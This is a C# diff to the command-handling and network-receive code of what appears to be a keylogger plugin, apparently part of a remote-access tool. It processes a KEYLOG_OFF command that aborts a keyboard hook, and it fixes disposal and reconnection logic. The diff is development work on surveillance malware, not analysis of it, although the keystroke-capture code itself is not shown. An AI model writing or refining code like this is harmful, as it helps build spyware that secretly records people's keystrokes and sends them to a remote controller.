@@ -72,6 +72,7 @@ namespace Plugin
 
             if (hasToExit)
             {
+                this.Dispose();
                 return;
             }
             else if (!Connected) 
@@ -87,12 +88,17 @@ namespace Plugin
         public void Receive()
         {
             if (hasToExit)
+            {
+                this.Dispose();
                 return;
+            }
+
             if (Connected)
                 readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
             else
                 ConnectStart();
         }
+
         private byte[] ReceiveData()
         {
             try
@@ -130,7 +136,7 @@ namespace Plugin
         {
             byte[] data = readDataAsync.EndInvoke(ar);
 
-            if (data != null && Connected)
+            if (data != null && data.Length > 0 && Connected)
                 readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
 
             Receive();
@@ -154,7 +160,6 @@ namespace Plugin
                 case PacketType.KEYLOG_OFF:
                     this.hasToExit = true;
                     KeyLib.Hook.AbortHook();
-                    this.Dispose();
                     break;
             }
         }
